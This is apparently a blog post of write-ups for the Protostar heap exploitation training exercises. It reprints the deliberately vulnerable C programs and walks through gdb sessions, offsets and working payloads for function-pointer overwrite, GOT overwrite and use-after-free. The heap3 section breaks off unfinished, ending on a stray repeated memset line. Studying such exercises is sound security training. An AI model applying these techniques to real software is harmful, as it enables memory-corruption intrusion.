---
layout: post
title: "Protostar | heap exploit-exercises solutions"
date: 2015-08-11
comments: true
categories:
---

Writeups for heap exploitation exercises, post will be continued.

##Heap0

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}

```

```
   0x080484eb <+95>:	mov    DWORD PTR [esp+0x4],edx
   0x080484ef <+99>:	mov    DWORD PTR [esp],eax
   0x080484f2 <+102>:	call   0x8048368 <strcpy@plt>
   0x080484f7 <+107>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484fb <+111>:	mov    eax,DWORD PTR [eax]
   0x080484fd <+113>:	call   eax
```

```
gdb-peda$ p winner
$2 = {void (void)} 0x8048464 <winner>
```

Address of fp->fp `0x804a050`, address of d->name `0x804a008`.
`0x804a050-0x804a008=0x48=72`

Lets verify it:

```
gdb-peda$ set arg $(python -c "print 'A'*72+'BBBB'")
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

Exploit:

```
gdb-peda$ set arg $(python -c "print 'A'*72+'\x64\x84\x04\x08'")
gdb-peda$ run
gdb-peda$ 
level passed
[Inferior 1 (process 24288) exited with code 015]

```


##Heap1

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

  

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

The vulnerability:

```c
  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);
```

As we can overflow the i2->name address with the first strcpy call, we can change the write address.

Overwriting the destructor functions seems like the easiest choice.

```
root@kali:~/Desktop/pentest/protostar/heap# nm ./heap1 | grep DTOR
08049674 D __DTOR_END__
08049670 d __DTOR_LIST__
```

We will overwrite `0x08049674`, the first function pointer in the destructor array, with the address of winner.

```
gdb-peda$ p winner
$1 = {void (void)} 0x8048494 <winner>
```

The addresses of i1->name content and i2->name address is needed to know the offsets.

Strcpy call for i1->name:

```
   0x8048531 <main+120>:	mov    DWORD PTR [esp+0x4],edx
   0x8048535 <main+124>:	mov    DWORD PTR [esp],eax
=> 0x8048538 <main+127>:	call   0x804838c <strcpy@plt>
```

eax contains `0x804a018` so thats the address of i1->name.

Malloc call for i2->name:

```
   0x080484f1 <+56>:	mov    DWORD PTR [esp],0x8
   0x080484f8 <+63>:	call   0x80483bc <malloc@plt>
   0x08048517 <+94>:	mov    edx,eax
   0x08048519 <+96>:	mov    eax,DWORD PTR [esp+0x18]
=> 0x0804851d <+100>:	mov    DWORD PTR [eax+0x4],edx <-- i2->name = location of allocation.


```

edx contains `0x804a02c` ie the
i2->name pointer location.

`0x0804a02c-0x804a018=0x14=20`

Exploit:

```
argv[1] = 20 bytes padding + 0x08049674 (dtor destructor function)
argv[2] = 0x8048494 (address of winner)
```

Verification of our writes:

```
gdb-peda$ x/w 0x08049674
0x8049674 <__DTOR_END__>:	0x08048494
gdb-peda$ p winner
$11 = {void (void)} 0x8048494 <winner>
```

But it dosn't execute, other writeups have the same problem and another method that worked out for them was GOT overwrite, I will try it out too.

[How to Hijack the Global Offset Table with pointers](https://www.exploit-db.com/papers/13203/) is a great reference and the method seems quite simple, almost as simple as a dtor array overwrite.

We will overwrite the global offset table address for the puts call as puts is called later down in main.

```
0x08048561 <+168>:	call   0x80483cc <puts@plt>
```

```
gdb-peda$ x/i 0x80483cc
0x80483cc <puts@plt>:	jmp    DWORD PTR ds:0x8049774
```

So we will overwrite `0x8049774` with the address of winner.

Lets verify it:

```
gdb-peda$ x/w 0x8049774
0x8049774 <puts@got.plt>:	0x08048494
gdb-peda$ p winner
$15 = {void (void)} 0x8048494 <winner>
```

The final exploit looks like this:

```python
import struct
def conv(num):
	return struct.pack("<I",num)

#detorAdr = 0x08049674
gotPutsAdr = 0x8049774
padding = "A"*20

winner = 0x8048494

arg1 = padding+conv(gotPutsAdr)
arg2 = conv(winner)

print arg1 + " " + arg2
```

```
root@kali:~/Desktop/pentest/protostar/heap# ./heap1 $(python -c "import heap1")
and we have a winner @ 1439407697
```

##Heap2

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break;
      
      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
      if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}
```

Without digging deep into the heap structure one sees that it is possible to make the `auth structure pointer` point at undefined memory 
by first running `auth` and after `reset`

This combined with the possibiliy to enter data on the heap with the `service` option, means that we probably can overwrite the location auth points at and in return make auth->auth non null and the login will pass.

Lets verify our theory:

```
root@kali:~/Desktop/pentest/protostar/heap# ./heap2 
[ auth = (nil), service = (nil) ]
service
[ auth = (nil), service = 0x804c008 ]
auth apa
[ auth = 0x804c018, service = 0x804c008 ]
reset
[ auth = 0x804c018, service = 0x804c008 ]
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x804c018, service = 0x804c028 ]
login
you have logged in already!
[ auth = 0x804c018, service = 0x804c028 ]
```

##Heap3

Time to do some reading on heap exploitation
http://phrack.org/issues/57/8.html#article <-- theoretical
http://phrack.org/issues/57/9.html#article <-- dlmalloc part most interesting, great paper, should read it...
http://www.cgsecurity.org/exploit/heaptut.txt <-- popular
http://phrack.org/issues/66/6.html#article <-- newer method 
The shellcoders handbook, chapter 5 <-- great one
(Procedure Linking Table)
http://hamsa.cs.northwestern.edu/media/readings/heap_overflows.pdf <-- w00w00 heap exploit paper, okay but not super...

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

Notes:
x/xw bufAdr-4 = length of buffer+8 bytes (chunk information)+1(lowest order bit set if there is no previous chunk)

Lets verify this, first malloc call:

```
gdb-peda$ i r eax
eax            0x804c008  0x804c008
gdb-peda$ x/xw 0x804c008-4
0x804c004:  0x00000029
gdb-peda$ p 0x00000029-8
$16 = 0x21
gdb-peda$ p /t 0x21
$17 = 100001
```

Lowest bit is set as expected as no prior malloc call have been made.

Lets continue to the the second call.

```
gdb-peda$ i r eax
eax            0x804c030  0x804c030
gdb-peda$ x/xw $eax-4
0x804c02c:  0x00000029

```
memset(buf2, 'A', BUFSIZE-1), buf2[BUFSIZE-1] = '\0';
memset(buf2, 'A', BUFSIZE-1), buf2[BUFSIZE-1] = '\0';
